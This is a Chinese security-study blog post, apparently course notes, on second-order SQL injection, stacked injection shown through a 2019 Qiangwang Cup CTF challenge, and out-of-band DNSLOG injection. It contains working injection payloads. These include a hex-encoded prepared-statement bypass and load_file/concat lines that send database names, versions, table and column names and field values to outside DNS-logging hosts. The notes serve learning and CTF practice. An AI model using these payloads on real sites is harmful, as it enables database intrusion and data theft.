@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        web攻防笔记第45天 | KillMen's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">web攻防笔记第45天</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/xiaodi8/" class="post-tag">#xiaodi8</a>
+  
+    <a href="/tags/web%E6%94%BB%E9%98%B2/" class="post-tag">#web攻防</a>
+  
+
+
+          <span class="post-date">2023-07-22</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h3 id="PHP-MYSQL-二次注入-DEMO-amp-74CMS"><a href="#PHP-MYSQL-二次注入-DEMO-amp-74CMS" class="headerlink" title="PHP-MYSQL-二次注入-DEMO&amp;74CMS"></a>PHP-MYSQL-二次注入-DEMO&amp;74CMS</h3><h4 id="1、DEMO-用户注册登录修改密码"><a href="#1、DEMO-用户注册登录修改密码" class="headerlink" title="1、DEMO-用户注册登录修改密码"></a>1、DEMO-用户注册登录修改密码</h4><p>①未登录前修改</p>
+<p>②登录后的修改-修改过程直接验证旧密码和接受新密码</p>
+<p>一般他会要你输入你的用户名吗？不需要</p>
+<p>用户名从哪里来？</p>
+<p>获取当前你登录的用户名当作修改条件</p>
+<p><code>update users set password=&#39;a123456&#39; where username=&#39;killmen&#39;</code></p>
+<p>killmen’ and updatexml()….</p>
+<p>如果源码里面<strong>有转义：前加’后加#是没用的</strong>，会报错，插入不进去</p>
+<h5 id="二次注入的条件"><a href="#二次注入的条件" class="headerlink" title="二次注入的条件"></a>二次注入的条件</h5><p>①<strong>必须要有这一句</strong>：<code>$username = addslashes($_POST[&#39;username&#39;]);</code>(这句本是防止普通单独注入)</p>
+<p>②有先插入后利用的功能</p>
+<p><u>二次注入通常是在白盒下审计代码申出来的，黑盒未知代码则很难测试</u></p>
+<h4 id="2、CMS-74CMS个人中心简历功能"><a href="#2、CMS-74CMS个人中心简历功能" class="headerlink" title="2、CMS-74CMS个人中心简历功能"></a>2、CMS-74CMS个人中心简历功能</h4><p>黑盒思路：<strong>分析功能有添加后对数据操作的地方</strong>（功能点）</p>
+<p>白盒思路：<strong>insert后进入select或update的功能的代码块</strong></p>
+<p>注入条件：<strong>插入时有转义函数或配置，后续有利用插入的数据</strong></p>
+<h3 id="PHP-MYSQL-堆叠注入-DEMO-amp-CTF强网"><a href="#PHP-MYSQL-堆叠注入-DEMO-amp-CTF强网" class="headerlink" title="PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网"></a>PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网</h3><p>堆叠注入触发的条件很苛刻，因为<strong>堆叠注入原理就是通过结束符同时执行多条sql语句</strong>，</p>
+<p>例如php中的<code>mysqli_multi_query</code>函数。与之相对应的<code>mysqli_query()</code><strong>只能执行一条SQL</strong>，所以要想目标存在堆叠注入，在目标主机存在类似于<code>mysqli_multi_query()</code>这样的函数，根据数据库类型决定是否支持多条语句执行。</p>
+<h4 id="堆叠注入条件"><a href="#堆叠注入条件" class="headerlink" title="堆叠注入条件"></a>堆叠注入条件</h4><p>1、目标存在sql注入漏洞</p>
+<p>2、目标未对”<code>;</code>“号进行过滤</p>
+<p>3、目标中间层查询数据库信息时可同时执行多条sql语句</p>
+<p><strong>支持堆叠数据库：MYSQL MSSQL Postgresql等</strong></p>
+<h4 id="2019强网杯-随便注（CTF题型）"><a href="#2019强网杯-随便注（CTF题型）" class="headerlink" title="2019强网杯-随便注（CTF题型）"></a>2019强网杯-随便注（CTF题型）</h4><p>堆叠注入和二次注入喜欢在CTF里考，真实就是看白盒审计</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;show databases;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>;<span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;;show columns from `1919810931114514`;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>;<span class="keyword">select</span> flag <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;</span><br><span class="line"></span><br><span class="line">#有时候过滤了<span class="keyword">select</span>等关键字，可用以下方法：利用变量把查询语句加密后赋值到<span class="keyword">SeT</span>里</span><br><span class="line"><span class="string">&#x27;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="PHP-MYSQL-带外注入-DEMO-amp-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-amp-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h3><p>太花里胡哨了，面试题会问，实战没有哦，有高权限还load_file()，整那么多没用的带外干啥</p>
+<h4 id="0-注入条件"><a href="#0-注入条件" class="headerlink" title="0.注入条件"></a>0.注入条件</h4><p>**ROOT高权限且支持<code>load_file()</code>**【打开控制安全文件开关：<code>secure-file-priv=</code>】</p>
+<p><strong>有部分注入点是没有回显的，所有读取也是没回显的，采用带外</strong></p>
+<h4 id="1-使用平台"><a href="#1-使用平台" class="headerlink" title="1.使用平台"></a>1.使用平台</h4><p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
+<h4 id="2-带外应用场景"><a href="#2-带外应用场景" class="headerlink" title="2.带外应用场景"></a>2.带外应用场景</h4><p>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
+<p>SQL注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> (select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;//&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.69knl9.dnslog.cn/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询当前数据库</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,<span class="title function_ invoke__">database</span>(),<span class="string">&quot;.dbuh8a.ceye.io\\asdt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询其他数据库</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,(select schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 0,1 查询第一个数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 1,1 查询第二个数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 2,1 查询第三个数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询版本号</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,<span class="title function_ invoke__">version</span>(),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询当前数据库demo01中第一个表名</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,(select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;demo01&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span> ),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 0,1 查询第一个表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 1,1 查询第二个表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">limit 2,1 查询第三个表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询security数据库emails表下第一个列名</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,(select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;emails&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询字段值 数据库名为security 表名emails 列名id</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,(select id <span class="keyword">from</span> security.emails limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/24/HTB-Vaccine/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>HTB-Vaccine</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/18/HTB-Archetype/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      HTB-Archetype
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">莫</div><div class="matts">挨</div><div class="matts">姥</div><div class="matts">子</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">乐</div><div class="matts">骟</div><div class="matts">好</div><div class="matts">弑</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:假的@email.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI3NzQ4NDkzNg==&mid=2247484469&idx=1&sn=8a442bb67397f52cce5c38c3f9b41e36&chksm=eb64c0d2dc1349c40d2e1bb55615ae28b3f2951be22f00717b9ade98c851082e42dc666ab45d#rd">微信公众号</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:假的@email.com">假的@email.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">KillMen's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
